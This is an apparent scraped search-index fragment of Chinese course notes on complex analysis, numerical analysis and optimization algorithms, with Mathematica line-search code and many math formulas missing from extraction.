其中 定义 整函数: 在整个复平面上都解析的函数 定理 Liouville 定理: 有界整函数必为常数 利用 Liouville 定理可证明代数学基本定理: 平面上, 必有零点. 调和函数 定义 调和函数: 二元实变函数在区域内具有二阶偏导数, 满足 Laplace 方程 定义 共轭调和函数: 是调和函数, 定理 解析函数 的虚部 是实部 的共轭调和函数 偏积分法: 不定积分法:"},{"title":"复变函数速通 - 级数","path":"/wiki/complex/series.html","content":"复级数的收敛性 定理 复级数收敛 实部, 虚部分别收敛. 复常数项级数的收敛性类似实数常数项级数. 复变函数项级数的一致收敛性质类似实数函数项级数. 一致收敛的复变函数项级数具有类似实数的连续性定理和逐项积分定理, 对于逐项求导的情况, 条件更弱. 定义 内闭一致收敛: 在区域内任意有界闭集上一致收敛 定理 在圆 内闭一致收敛 , 在 一致收敛 定理 在 内解析 复变函数项级数内闭一致收敛 解析且可任意阶逐项求导 幂级数, 只需注意收敛域是圆盘. Taylor 级数 定理 Taylor 级数: 在区域 内解析, , 只要圆盘 包含于 , 则 在 内能唯一展开成幂级数 为任意圆周 复变函数 Taylor 展开的要求比实变函数低很多 定理 在区域 内解析 在区域内任一点能展开成 Taylor 级数. 定理 的收敛半径 在 上至少有一奇点 在 出的收敛半径 , 是距离 最近的奇点 孤立零点 定义 零点: , , 定义 阶零点: 定理 是不恒为零的解析函数 阶零点 存在 解析, 定理 解析函数零点的孤立性: 内解析函数不恒为零, 为零点 存在 的邻域, 在其中只有一个零点. 推论 在 内解析 数列 , 或在圆盘的子区域, 子弧内恒为零 在区域内恒为零 定理 唯一性定理: 在区域内解析 存在收敛到 的点列 , 有 只要等号左右解析, 一切在实轴上成立的恒等式, 在 平面上也成立 Lauent 级数 在 不解析, 希望将 表示为 的幂级数 双边幂级数: 包含正幂项和负幂项 主要部分解析部分 若解析部分具有收敛半径 , 则收敛域 ; 主要部分作代换 , 幂级数 收敛半径为 , 则对于 的收敛域是 . 当两收敛域有公共部分时, 双边幂级数在圆环域上收敛, 否则处处发散. 则双边幂级数的收敛域可写作 特殊圆环域 双边幂级数在收敛域内满足 和函数绝对收敛且内闭一致收敛 和函数可逐项求导任意次 和函数可逐项积分 定理 Lauent 展开: 在圆环域 内解析 可唯一展开成双边幂级数 为任意圆周 类似 Taylor 级数, 收敛域内外圆周上必有奇点. Lauent 展开式的奇点不一定与原函数奇点相同 孤立奇点 奇点的分类 定义 孤立奇点: 复变函数在某点不解析, 但存在该点的去心邻域, 函数在此邻域内解析 根据孤立奇点处 Lauent 级数的负幂项数量, 将孤立奇点分为 可去奇点 Lauent 级数无负幂项 在 的去心邻域内有界 阶极点 Lauent 级数中含有 项 负幂项, 最高为 存在 在 的邻域内解析, , 存在 以 为 阶零点 (不能判断阶数) 本质奇点 Lauent 级数有无限多负幂项 既不收敛到有限数, 也不发散到无穷 若 在 充分小邻域内不为零, 则 是 的本质奇点 (Picard) (有限数, 无穷), , 定理 Schwarz 引理: 在单位圆 内解析 在单位圆 内 , 若至少一点处能取等， 则 无穷远点 定义 无穷远点是孤立奇点： 在无穷远点的去心邻域 内解析 只需令变换 , 然后讨论 在 的性质 无穷远点作为 的奇点的分类 可去奇点 Lauent 级数无正幂项 在 内有界 阶极点 Lauent 级数中含有 项 正幂项, 最高为 存在 在 内解析, , 存在 以 为 阶零点 () (不能判断阶数) 本质奇点 Lauent 级数有无限多正幂项 既不收敛到有限数, 也不发散到无穷 整函数与亚纯函数 定义 在整个 平面上解析的函数称为整函数 只有 孤立奇点 定理 是整函数 是可去奇点 是 阶奇点 是本质奇点 级数中有无穷个 (超越整函数) 定义 亚纯函数: 在 平面上除了极点无其它类型奇点的单值解析函数 定理 为有理函数 在扩充 平面上除极点外无其它类型奇点 则有理函数 亚纯函数, 非有理的亚纯函数称为超越亚纯函数 留数 绕 的孤立奇点 的积分, 应用 Lauent 级数逐项积分 高阶导数公式积分定理 定义 在孤立奇点 处的留数 定理 Cauchy 留数定理: 解析函数绕多个孤立奇点 的积分 留数的求法: 可去奇点: 本质奇点: 展开成 Lauent 级数求 阶极点 则 当 比 的实际阶数高时, 公式仍有效 与高阶导数公式等价 一阶极点 二阶极点 在 解析, 无穷远点的留数 定义 无穷远点作为孤立奇点的留数 顺时针方向看作绕无穷远点的正向, 无穷远点的留数是在无穷远点的 Lauent 计数 项系数的相反数 定理 在扩充 平面上只有有限个孤立奇点, 则在各点的留数总和为零. 通过计算无穷远点的留数计算 定理 计算无穷远点留数的公式 实积分 是有理函数且满足留数定理的条件, 只需求单位圆周内各个奇点处的留数. 围道积分法 为多项式, , 实轴上 , 为多项式, , 实轴上 , 利用 拆开 的实部虚部, 可得到 辐角原理 定义 关于曲线 的对数留数 的零点和奇点都可能是 的奇点 定理 是 的 阶零点 一阶极点 是 的 阶极点 一阶极点 定理 是一周线, 满足 在 内部亚纯 在 上非零解析 记 内零点总阶数 , 极点总阶数 对数留数的几何意义, 展开复对数 而绕周线一周后, , 而 可能改变 的整数倍, 将辐角的连续变化记为 . 定理 辐角原理: 是一周线, 满足 在 内部亚纯 在 上非零解析 即 在 内部的零点阶数与极点阶数之差, 等于当 沿 的正向绕行一周后 的改变量除以 Rouche 定理 定理 是一条周线, 和 满足 在 内亚纯 在 上 和 在 内有同样多阶数的零点 可比较两函数的零点个数 定理 区域内单叶解析函数"},{"title":"数值分析速通 - 基础知识","path":"/wiki/numeric/basic.html","content":"误差 准确值 , 近似值 绝对误差 相对误差 相近的数相减, 相对误差增大 小数做除数, 绝对误差增大 数值计算的基本原则 避免绝对值小的数做除数 防止大数吃小数 (数量级相差大的数相加减) 避免相近的数相减 减少 Flops 非线性求解方程 二分法 二分法伪代码 不动点迭代 不动点迭代伪代码 定义, 全局收敛, 局部收敛, Lipschitz 收敛 推论: 在 连续, 可微, , 在 上存在唯一不动点 局部收敛定理: 局部收敛 越接近零, 则不动点迭代收敛越快. 时将具有更高的收敛阶. 精度的极限 精度的极限 前向误差: 迭代点值不准确 后向误差: 迭代公式计算不准确 (如存在浮点误差) 误差放大因子: 相对前向误差 / 相对后向误差 条件数: 问题本身所决定的误差放大 原问题: 有误差的问题 说明Taylor 展开 得到根的敏感公式: 误差放大因子 要探讨迭代公式中某一项造成的误差, 就把这一项代入 牛顿迭代法 是一种特殊形式的不动点迭代, 希望提高迭代的收敛阶, 构造不动点迭代使得 迭代公式 (切线近似): 二阶收敛 , 则牛顿法局部二次收敛, 迭代误差 满足 更高阶收敛的情形 线性收敛 重根 改进为局部二次收敛 重根且 , 使用迭代公式 局部二次收敛 牛顿下山法 推广到非线性方程组"},{"title":"数值分析速通 - 线性问题","path":"/wiki/numeric/linear.html","content":"线性方程组的直接解法 高斯消元 高斯消元 得到左侧上三角阵, 回代求解. 消元复杂度 , 回代复杂度 LU 分解 LU 分解不唯一, 可规定对角线上元素为 1 伪代码 LU 分解定理: 的前 个主子式非奇异, 则有 LU 分解 (那不就是可逆吗) 误差 算子范数 最大绝对列和 , 的谱半径 (特征值最大模) 的平方根 最大绝对行和 求解 的误差 近似解 的前向误差 后向误差 误差放大因子 条件数: 求解 时对于所有 可能出现的最大误差放大因子 定理: 可逆方阵的条件数为 前向和后向误差满足 淹没现象 列主消元 联系 顺序高斯消元 顺序高斯消元后, 左侧的上三角阵为 , 右侧从 开始变换, 逆为 列主高斯消元增加 矩阵 严格行对角占优矩阵: 对角线元素比这一行其他元素加起来大 定理：不选主元Gauss消元法保持矩阵的严格行对角占优性质 推论：行对角占优矩阵非奇异且有 LU 分解 线性方程组的迭代法 称为分裂矩阵, 写成不动点迭代形式 迭代矩阵 不同的迭代方法的区别为构造了不同的 和 . 和 应当容易计算. Richardson 迭代 是单位严格行 / 列对角占优矩阵时收敛 (主对角线全为 1) Jacobi 迭代 D, L, U 是 A 的部分 是严格行对角占优矩阵时收敛 Gauss-Seidel 迭代 是严格行对角占优矩阵时收敛 主对角元非零收敛 SOR 迭代 添加 “动量” 项 即 Gauss-Seidel 迭代推广到 SOR 迭代形式 欠松弛 Gauss-Seidel 超松弛 需要实验确定收敛最快的 主对角元非零, 收敛 对称正定线性方程组的解法 若 是对称正定矩阵，则求解 的 SOR 迭代对于任意初始向量收敛。 Cholesky 分解 实对称正定矩阵可以分解为 , 是下三角阵 伪代码 梯度下降法 对称正定, 则求解 等价于 极小化二次型问题 其中 梯度下降法迭代公式. 共轭梯度法 迭代公式 矩阵特征值的数值解法 通过高次多项式求根解特征值是病态问题, 需要更好的方法 盖尔圆盘 通过盖尔圆盘可估计特征值的大概范围 盖尔(Gershgorin)圆盘定理：方阵 的谱（特征值集）包含在下列复平面中 个圆盘 的并中 说明对 的每一个分量 圆心是对角线元素, 半径是每一行的和. 特征值与 相同, 对于列也有 则特征值位于 的并交 的并中 盖尔(Gershgorin)圆盘第二定理：设方阵 的 个盖尔圆盘分成若干个连通区域，若一个连通区域含有 个盖尔圆盘，则有且只有 个特征值落在这个连通区域内（若两个盖尔圆盘重合，需计重数；又若特征值为重根也需计重数） 推论1：严格对角占优矩阵可逆。 推论2：方阵的 个盖尔圆盘两两互不相交，则相似于对角阵。 推论3：实方阵的 个盖尔圆盘两两互不相交，则特征值全为实数。 扰动矩阵特征值圆盘定理：若 阶方阵 用相似变换 对角化，而 是任意 阶方阵，则 的特征值 位于下列圆盘之并中： 通过条件数估计特征值偏离的范围. 幂法 将矩阵反复作用于一个向量, 最终方向会接近于矩阵的一个特征向量. 将向量 用特征向量 作为基表出, 迭代公式 当 时, 有 特征向量 特征值 线性收敛率 若最大特征值是两重, , 特征值 特征向量 通过以上方法求出模长最大的特征向量. 求解其他特征向量 模长最小: 离 最远: 离 最近: Rayleigh 商迭代 已知近似特征向量 , 求解超定方程 最小化残差 Rayleigh 商 QR 分解 把 分解为 , 是正交阵, 是上三角阵 消减 QR 分解: ( 的列向量不够多, 没有求出完整的正交基) 完全 QR 分解: (任意补充 个向量得到完整正交基, 矩阵多余的部分补零) Gram-Schmit 正交化 对 的每个列向量, 依次减去与前面的向量平行的分量并归一化, 得到正交向量组作为 矩阵, 记录系数作为 矩阵 Gram-Schmit 正交化实现消减 QR 分解 要实现完全 QR 分解, 先任意补充线性无关组 R 矩阵下方补零 两种形式在数学上等价, 但如果因为数值计算的误差导致靠前的向量之间没有完全正交, 改进的方法仍然能尽量保持后面的向量之间的正交性. 时间复杂度: Householder 变换 Householder 反射子定义 则 是 关于超平面 的镜像. 已知向量 和 满足 , 可令 求出 使得 利用 Householder 变换实现 QR 分解, 方法是通过叠加多个 Householder 反射子得到 矩阵 由 矩阵的形式, 每增加 中新的向量作为 时, 可以容易得到对应的 , 则可以求出 . 构造第一列的 w 并得到 H1 后续只处理 Tilde A, 不需要处理 W, H 矩阵之前处理好的部分用 I 填充 伪代码 Householder 变换直接得到的是完全 QR 分解, 数值稳定性比 GS 正交化好. QR 算法 求出矩阵的所有特征值. 选取一组正交向量同时进行幂迭代，每次迭代都对向量进行正交化，最终可得到所有的特征向量及对应的特征值. 伪代码"},{"title":"数值分析速通 - 非线性问题","path":"/wiki/numeric/non-linear.html","content":"插值 插值问题的数学定义: 为区间 上的函数, 为 上 个互不相同的点 (插值结点), 求 满足 , 称为基函数. 不同插值方法的区别在于基函数的选取方式和插值结点的选取方式. 给定基函数和插值结点, 可解线性方程组得到系数 基本多项式插值 很显然, 选取相同的插值结点, 多项式插值的 的符号结果都是相同的, 但不同的算法的数值精度和计算复杂度有差异. 多项式插值 系数矩阵 形式简单, 但是系数矩阵条件数大 Lagrange 插值 构造一组多项式基函数 , 使得 成为对角阵, 便于求解. 条件: 容易得到 满足条件, 可以简单取 Lagrange 插值不用求解 , 但此形式仍然计算复杂度较高. Newton 插值 希望能够增量计算新的插值节点, 而不改变之前插值结点的系数, 方便计算. 选取基函数 系数矩阵是下三角阵, 可直接回代求解 规定记号 为 阶 Newton 差商, 则回代求解过程可如下表示 差商计算过程 可以滚动数组优化内存 得到系数 后, 的计算可以使用秦九韶算法节约复杂度. Chebyshev 插值 Motivation 多项式插值误差定理: , 是 上不超过 次的插值多项式, 则 其中 这个形式显然是 Taylor 展开的 Lagrange 余项 Runge 现象, 在区间的两端剧烈震荡 进行高次多项式插值的弊端, 高阶导数 可能巨大. 为了避免区间端点处的震荡, 可以向外拓展插值结点; 也可以通过合理选取插值结点, 尽量减小 项. Chebyshev 多项式给出的插值结点能最小化这一部分的误差. 性质 第一类 阶 Chebyshev 多项式: Chebyshev 多项式的性质 Chebyshev 多项式的图像 Chebyshev 多项式的零点均匀地分布在圆周上 证明 Chebyshev 多项式是区间上值域最小的首一多项式 说明反证: 设首一多项式 比 小, 则是 次多项式且有 个零点, 则恒为零, 在标准区间 上选取 Chebyshev 多项式的根作为插值结点, 误差满足 把标准区间变换到任意区间 误差满足 Hermite 插值 除了插值结点处的函数值, 把一阶导数值等也纳入插值方程. 需要根据选取的方程条件数量确定插值的次数, 防止无解或多解. Hermite 插值定理：存在唯一的次数至多是 的多项式 满足 个Hermite 插值条件 只有一个插值结点, 条件是 0 至 阶导数值的 Hermite 插值就是 Taylor 展开. Hermite 插值的 Newton 差商型构造 直接把已知的 次导数值替换掉多出的 次差商(红色部分). 亦可以处理对不同插值节点指定了不同阶数的导数的情况, 见作业题 形式上容易理解 样条插值 高次多项式插值有种种问题, 还是分段用低次多项式近似吧. 节点 上的 次样条满足 在每个子区间 上是 次多项式 在整个区间 上 次连续 零次样条插值即为分段常数函数, 一次样条为分段线性函数, 常用三次样条 也可以用其他方式指定左右边界的二阶导数或一阶导数 数据拟合与最小二乘 数据拟合也是用基函数线性组合, 但不要求精确过每个点, 要求曲线到给定数据点的距离最小 求解最后的矩阵就能得到最小二乘拟合系数. 最后的矩阵可以写作 超定线性方程组最小二乘法 法线方程 最小二乘的几何解释 公式被称作法线方程, 是超定方程 的最小二乘解 对于非线性问题的最小二乘拟合, 需要选取合适的基函数, 还可能需要取对数来线性化. QR 分解 直接使用法线方程计算最小二乘解数值不稳定. 可利用 QR 分解来求解. d 的下面部分与 x 无关, 则上面为 0 时模长最小 只需进行完全 QR 分解, 然后求解 数值微分 直接似是而非的去个小量 来近似好了 前向差商 后向差商 中心差商 二阶中心差商 用多项式插值的导数近似函数的导数. 两点插值得到的就是前向 / 后向差商, 三点插值得到中心差商 误差分析 通过 Taylor 展开的 Lagrange 余项控制误差的范围. 正确的差商公式都是 Taylor 展开式的变形 (确定插值点, 可以通过 Taylor 展开得到唯一正确的差商公式, 以及余项). 由于数值计算误差的存在, 的选取不是越小越好 Richardson 外推 对任何 的 阶近似 (不仅是数值导数问题) 都能再加一项缩减一半步长 至少是 的 阶近似. 待定系数法 给定插值点, 可以通过 Taylor 展开得到唯一正确的差商公式, 以及余项. 插值点数量已知时, 为了让这个方程有唯一解, Taylor 公式展开的阶数是确定的, 余项的阶数也能确定了. 解线性方程组求出系数后再带回展开式, 可能余项的系数为 0, 这时差商公式会具有更高的阶数. 数值积分 Newton-Cotes 积分 用插值函数的积分来近似原函数的积分, 积分节点等距的插值型数值积分称为 Newton-Cotes 积分. 在区间 上积分, 记 . 数值积分的代数精度, 指可以准确积分的多项式的最高阶数. 给定积分的插值结点, 可以根据插值结点数量确定至少具有的代数精度, 并列线性方程组解出唯一正确的积分系数. 求至少具有 n 数值精度的系数 从插值误差 推导积分误差, 使用积分均值定理, 不变号时存在 中一点 插值误差 一般形式的 Newton-Cotes 积分 为奇数时, Newton-Cotes 具有 阶代数精度. 为偶数时, Newton-Cotes 具有 阶代数精度. 梯形法则: 两点一次插值 Simpson 法则: 三点二次插值 中心法则: 使用中点函数值 三点开 Newton-Cotes 积分: 复合 Newton-Cotes 积分, 先把 划分为 个等距子区间, 记 , 再在每个子区间上应用 Newton-Cotes 积分, 避免高次插值的 Runge 现象. 对于子区间断点处的函数值, 计算时可以重复利用节约时间. 复合积分的误差, 将原来的 项替换为 项. 复合中心法则 复合梯形法则 复合 Simpson 法则 Romberg 积分 用 Richardson 外推法提高复合梯形法则的精度. 是 的复合梯形法则, 可递推计算, 补充新增的插值点. 实际上是复合 Simpson 法则. 伪代码 Gauss 积分 非均匀地选取插值结点, 使积分值具有尽可能高的数值精度. 可通过正交基构造. 找到 次多项式与 次多项式正交, 用他的根做插值结点就能达到 阶代数精度. Legendre 多项式是合适的构造. 标准区间上的 Gauss 插值节点 定义映射 把 映射到标准区间"},{"title":"最优化算法速通 - 约束优化","path":"/wiki/optim/constrained.html","content":"等式约束 正则点: 对于满足等式约束的点 , 梯度向量 线性无关. 是正则点 曲面 , 若 上所有点都是正则点, 则维数为 切线空间 , 即 的零空间. 正则点的切空间维数是 切平面 法线空间 正则点的法线空间的维数是 法平面 切线空间和法线空间互为正交补 Lagrange 条件 若 是极大点则满足 和 平行, 即 Lagrange 定理: 若 是正则点, 则 , 使得 是局部极小点的必要条件 Lagrange函数 若 是极值点, 则 , 满足 . Lagrange 定理的必要条件等价于将 Lagrange 函数视为无约束优化问题得到的一阶必要条件. Lagrange 函数关于 的 Hessian 矩阵: 二阶必要条件: 二阶充分条件: 二次规划 等价于 二次规划标准型 Lagrange 函数 Lagrange 条件 解得 一定满足二阶充分条件. 不等式约束 积极约束, 非积极约束: 不等式是否取等 正则点除了考虑等式约束线性无关, 不等式约束梯度也要线性无关. KKT 条件 设 是正则点和局部极小点, 则 , 使得 原始可行性: 对偶可行性: 原始最优性: 互补松弛条件: 二阶条件 起作用约束构成曲面的切空间 二阶必要条件: 二阶充分条件: 对偶问题 原问题 Lagrange 函数: 鞍点 是 Lagrange 函数关于 的极小值点, 关于 的极大值点 原问题: 对偶问题: 注意到对偶问题的内层 是关于 的无约束优化问题, 目标函数是凹函数 弱对偶定理: 是原问题可行解, 是对偶问题可行解, 则 即 对偶问题的解是原问题的解的下界. 强对偶定理: 上式取等 Lagrange 函数存在鞍点 求解方法 投影方法 希望使无约束优化的迭代格式 能够满足约束条件 投影: 设 是非空闭凸集, 任意 在 上的投影为 是非空闭凸集, 投影存在且唯一 当且仅当 是仿射流行时取等 是非扩张映射, 投影映射本身可能很难求 投影下的迭代格式: 投影梯度法: 仿射约束集 上的投影梯度法产生的迭代点满足 线性规划使用投影梯度法, 只要步长足够大, 一步就能得到最优解 Lagrange 法 Lagrange 函数: 使用梯度法, 每步关于 极小化, 关于 极大化: 对于不等式约束的情况 Lagrange 函数: 使用梯度法关于 极小化, 投影梯度法关于 极大化 罚函数法 指示函数 是罚函数, 需满足 连续 罚参数 越大, 则逼近程度越好. 增广 Lagrange 函数 把 Lagrange 函数与罚函数结合，解决罚参数过大问题"},{"title":"最优化算法速通 - 预备知识","path":"/wiki/optim/basics.html","content":"向量 线性相关: 存在表出系数 线性无关 线性组合 张成子空间 子空间的基, 维数 矩阵 保秩运算 初等变换 加入列向量组的线性组合列 乘以可逆矩阵 转置, 旋转, 镜像 矩阵的逆和计算 主逆副反号 线性方程组的解的存在性 (增广矩阵的秩) 方程组的解的表达 特解, 基础解系 特解+零空间平移 广义逆 内积与范数 内积 非负性 对称性 可加性 (线性性) 齐次性 (线性性) 范数 非负性 齐次性 三角不等式 Cauchy-Schwartz 不等式 , 当且仅当线性相关时等号成立 勾股定理: 对两正交向量, 任何范数都成立 p-范数 向量值函数连续性 复空间的内积 向量范数 矩阵范数 非负性 齐次性 三角不等式 相容性: F-范数 F-范数等价于向量空间上的欧式范数 导出范数 用行空间和列空间的向量范数导出矩阵范数 用A对n维单位向量做线性变换, 得到的最长m维向量的长度 线性变换 线性变换的定义 齐次性 可加性 线性变换的矩阵表示: 对坐标的变换 不同基之间的过渡矩阵: 从 到 的过渡矩阵 线性变换的特征值: 矩阵表示的特征值, 利用相似对角化求 正交矩阵 对称矩阵: 实对称矩阵一定可相似对角化 正交投影算子 性质: 对称, 幂等 二次型 正定 各阶顺序主子式大于零 特征值全大于零 半正定 所有主子式非负 (必要条件: 各阶顺序主子式非负) 特征值全非负 瑞利不等式 对实对称矩阵 有: 二次型的值被最大特征值和最小特征值限制"},{"title":"最优化算法速通 - 线搜索","path":"/wiki/optim/line-search.html","content":"在区间 上求一元单值函数的极小值点. 区间压缩方法 黄金分割法 要求目标函数是单峰的. 确定合适的参数 使得每次迭代只需计算一次函数 的值. 每一步只需要确定一个新点并计算一次目标函数的值(第1 步除外)。 123456789101112131415161718192021222324252627282930goldenSearch[fun_, var_, l0_, r0_, delta_] := Module[{f, a, b, fa, fb, l, r, \\[Rho], n}, ( f[x_] = N[fun /. var -&gt; x, precision]; \\[Rho] = 2 - GoldenRatio; l[1] = l0; r[1] = r0; a[n_] = l[n] + \\[Rho] (r[n] - l[n]); b[n_] = l[n] + (1 - \\[Rho]) (r[n] - l[n]); fa[n_] = f[a[n]]; fb[n_] = f[b[n]]; n = 1; While[r[n] - l[n] &gt; delta, If[fa[n] &gt; fb[n], ( l[n + 1] = a[n]; r[n + 1] = r[n] ), ( l[n + 1] = l[n]; r[n + 1] = b[n] ) ]; n++; ]; Print[ TableForm[ Table[{a[i], b[i], fa[i], fb[i], Interval[{l[i + 1], r[i + 1]}]}, {i, 1, n - 1}], TableHeadings -&gt; {Range[n - 1], {\"a\", \"b\", \"f(a)\", \"f(b)\", \"Next Interval\"} }]]; Return[{l[n], r[n]}]; )]; 总压缩比: 0.618, 经过 步压缩之后，极小点所在区间长度将压缩到初始区间长度的 Fibonacci 数列法 要求目标函数是单峰的. 仍然要求每次压缩区间能利用之前的取值, 希望允许每次迭代的压缩比改变, 使得固定步数的总压缩比最小, 则应使用 Fibonacci 数列的形式设置每步的压缩比. 满足下式时能利用之前的取值: 即 总压缩比: 视作有约束优化问题求解, 得到 注: . 总压缩比: 注意最后一次迭代 , 为了保证能产生两个不同的新点以便后续处理, 可取 , 总压缩比变为 1234567891011121314151617181920212223242526272829303132333435fibonacciSearch[fun_, var_, l0_, r0_, delta_] := Module[{f, a, b, fa, fb, l, r, \\[Rho], \\[Epsilon], n, i}, ( f[x_] = N[fun /. var -&gt; x, precision]; \\[Epsilon] = delta/10; n = 0; While[(1 + 2 \\[Epsilon])/Fibonacci[n + 2] &gt; delta/(r0 - l0), n++]; l[1] = l0; r[1] = r0; \\[Rho][i_] = If[i == n, 1/2 - \\[Epsilon], 1 - Fibonacci[n + 2 - i]/Fibonacci[n + 3 - i]]; a[i_] = l[i] + \\[Rho][i] (r[i] - l[i]); b[i_] = l[i] + (1 - \\[Rho][i]) (r[i] - l[i]); fa[i_] = f[a[i]]; fb[i_] = f[b[i]]; Do[ If[fa[i] &gt; fb[i], ( l[i + 1] = a[i]; r[i + 1] = r[i] ), ( l[i + 1] = l[i]; r[i + 1] = b[i] ) ], {i, n} ]; Print[ TableForm[ Table[{\\[Rho][i], a[i], b[i], fa[i], fb[i], Interval[{l[i + 1], r[i + 1]}]}, {i, 1, n}], TableHeadings -&gt; {Range[n], {\"\\[Rho]\", \"a\", \"b\", \"f(a)\", \"f(b)\", \"Next Interval\"} }]]; Return[{l[n + 1], r[n + 1]}]; )]; 二分法 要求目标函数是单峰的, 且一阶可导. 二分找到一阶导数的零点. 总压缩比为 , 优于以上两种. 插值类方法 牛顿法 要求目标函数二阶可导. 构造经过 的二次函数, 使得此处一阶导数和二阶导数相同. 二阶 Taylor 逼近: 的极小点: 则得到迭代公式: 牛顿法要求 在区间内成立, 否则可能收敛到极大点. 牛顿法也可以用来求 : 割线法 若目标函数二阶不可导而仅仅一阶可导, 用前两次迭代点的割线代替二次导数: 得到迭代公式: 若用于求根, 减少一次导数: 通用的插值方法 二次插值: 从一个点或多个点的原函数值, 一阶导数, 二阶导数中选择三个, 可确定一个二次函数拟合, 用二次函数的极值点来产生下一次迭代点. 牛顿法利用了一点的函数值, 一阶导数, 二阶导数; 割线法利用了两点函数值和一阶导数 (多余了) 三次插值则需要找到四个参数. 划界法 寻找目标函数极小点所在的初始区间. 只需要找出3 个点 ， 使得 函数值满足 和 选择 时可以如图不断向后倍增搜索. 多元函数极小值 函数 为步长, 为搜索方向. 或采用另一种记号, 记 为步长, 为搜索方向. 希望选取合适的步长和搜索方向, 使得 下降方向 一阶 Taylor 展开 下降方向: 与梯度夹角大于 步长选取 精确步长 对于二次函数 : 非精确步长 使用一些不等式来保证步长的选取比较优秀. Armijo 准则: 给定参数 , 通过起点处斜率的倍率划线, 保证下降的程度足够大, 只要 足够小总能满足, 公式 Goldstein 准则: 在 Armijo 的基础上还希望一步能走的尽量远, 再添加限制条件 Wolfe 准则: 在 Armijo 的基础上, 希望下一次的迭代点处的斜率不要太大, 在这个方向上一步到位, 不要再有微调的机会"},{"title":"最优化算法速通 - 凸集和凸函数","path":"/wiki/optim/convex.html","content":"几何概念 线段: 超平面: , 是法向量, 是截距 , 是平面上一点 半空间 正半空间 负半空间 线性簇: 线性方程组的解集 凸集 定义: 任意两点间的线段 (凸组合) 位于集合内 空集, 单点集, 线性簇是凸集 半正定矩阵集是凸集 保凸运算 数乘, Minkowoski 和(任意两个不同集的向量相加得到新集合), 交集 仿射变换 极点: 不能表达成集合内两个点连线段的”内点” 邻域, 内点, 开集, 边界, 闭集, 紧集 极值原理: 连续函数在紧集上一定能取到闭集 多面体 支撑超平面: 经过凸集的边界点, 使凸集完全位于一个半空间内 多面体: 可表示为有限个半空间的交集 非空有界的多面体: 序列与极限 矩阵序列 收敛于 : 矩阵收敛于零矩阵 矩阵的谱半径小于 1 矩阵的幂级数收敛 矩阵收敛于零矩阵 矩阵值函数 在某点连续且函数值可逆, 则存在邻域使得 存在且连续 可微性 仿射函数: 存在线性函数 和向量 , 使得 可微性: 理解为对函数仿射逼近 (一阶 Taylor 逼近) 一元函数时, 退化为一元函数的导数 多元函数时, 退化为多元函数的梯度 列向量 行向量 向量值函数 的导数 (Jacobi 矩阵 ): 纵轴(第一维)是因变量, 横轴(第二维)是自变量 Hessian 矩阵: 梯度的 Jacobi 矩阵, 二阶导 链式法则: 注意把向量的形状凑对, 求复合函数的 Jacobi, 只需外层 Jacobi 乘内层 Jacobi 方向导数: 单位方向向量点乘梯度 水平集 单值函数在水平 上的水平集(等值线): 等值线不相交 等值线疏密程度刻画函数变化快慢 等值线与梯度垂直 等值线在极值点附近近似为椭圆 Taylor 展开 可微函数 在 的切线超平面: 同阶无穷小 : 在原点的某邻域内有界 高阶无穷小 : 多元数量值函数的二阶 Taylor 展开 (假设二阶可微) 余项也可以是 . 更高阶的 Taylor 展开很难写出, 因为导数是高维张量. 中值定理 (类似 Lagrange 中值) 极小点 局部极小点: 去心邻域内 全局极小点: 严格局部极小点: 去心邻域内 严格全集极小点 可行方向 : 最优性条件 是局部极小点, 是任意可行方向 一阶必要条件: 若 是内点, 则 二阶必要条件: 且 若 是内点, 则 且 Hessian 矩阵半正定 二阶充分条件: 是内点, 则 且 Hessian 矩阵正定"},{"title":"最优化算法速通 - 线性规划","path":"/wiki/optim/linear-programming.html","content":"标准型 约束集：是凸多面体, 多胞形 凹函数在凸集上的极值点一定是集合的边界点, 线性规划的极值点一定是多胞形的顶点 解的存在性 可行域为空集, 无最优解 可行域为有界闭集, 最优解不唯一 可行域为无界集, 不确定有无最优解 线性规划标准型: 其中 化为标准型: 最大化转化为最小化相反数 不等式约束引入松弛变量化为等式约束 (确保不等式只需大于等于0, 同时反转不等号方向) 决策变量属于实数 时, 对分量进行非负拆分 则两侧同乘 -1 线性规划的解 其中 从 中任选 个线性无关的列向量记作 , 则 , 则 在 下的基本解: 是 的一个解 基变量: 中的元素 基本列向量: 中的列向量 退化的基本解: 中有变量是 0 可行解: 满足约束条件 基本可行解: 可以通过暴力枚举 (要保证 可逆)的方法求所有基本可行解 最多有 个基本解 退化的基本可行解 最优可行解: 满足约束条件且使得 取得极小值 线性规划基本定理: 存在可行解 存在基本可行解 存在最优可行解 存在最优基本可行解 则可以通过搜索有限数量的基本可行解来求解线性规划问题. 但直接枚举复杂度很高, 需要更好的做法 解的性质: 基本可行解 非零分量对应的列向量组线性无关 在可行域的顶点处取得 最优解一定在可行域的顶点处取得 单纯形法 从某个基本可行解变换到另一个基本可行解, 直到找到最优基本可行解. 转轴元素 行的选择: 希望能保证变换后 , 保证基本解的可行性. 于是在第 列中选择满足以下条件的元素: 这样能使得 尽量大: 判断解的最优性 设 的前 列 是基向量, , , , 约束条件: 若 , 则为基本可行解, , 目标函数值: 若 , 则 . 定义 , 则目标函数值 则 最优解. 若 中存在负分量, 则将 中相应的值从 0 变为正数, 目标函数值就能变小, 通过转轴运算更新一次矩阵 单纯形表的矩阵表示 线性规划的基、基变量、基本可行解、判别式、函数值都在最后一个矩阵中. 将初始单纯形表转化为标准单纯形表, 需要做行初等变换使得基变量所在列的判别式值为 0, 然后进行单纯形表的操作： 若上述矩阵中的判别式全部非负，则此时的基本解就是最优解，最优值的相反数在矩阵的右下角 若上述矩阵中的判别式有负元素，则取最小的负元素所在的列进基，做1次转轴运算, 同时通过行初等变换更新判别式的值 例子: 确定初始可行基 有些明显的初始可行基可以直接看出来, 有的不行, 穷举 个列向量不现实, 需要更好的方法. 两阶段法 P0 有基本可行解 P1 有最优解且最有函数值为 0 (第一阶段) P1 初始时基变量全部位于人工变量中, 基变量的判别式均为 1 通过行初等变换化为标准单纯形表, 使得基变量的判别式为 0 做转轴变换直到求出最优解 若最优解不为 0 则无解 若有基变量在人工变量中 若这一行 , 则直接删除行 否则任选一个非零 做转轴变换使得人工变量出基 删除人工变量的列 (第二阶段) 根据最小判别数不断做转轴运算求最优解. 若 , 则 P0 无解. 大 M 方法 加入至多 个人工变量 使得能找出一组基, 求解含参 线性规划问题, 使用判别数时认为 时无穷大, 得到的解就是原问题的解. 对偶线性规划 原问题 (P): 对偶问题 (D): 弱对偶定理: 原问题可行解, 对偶问题可行解, 若 , 则 和 是各自问题的最优解 如果 (P) 问题有最优解，那么 (D) 问题也有最优解，并且它们的最优函数值相同 互补松弛定理: 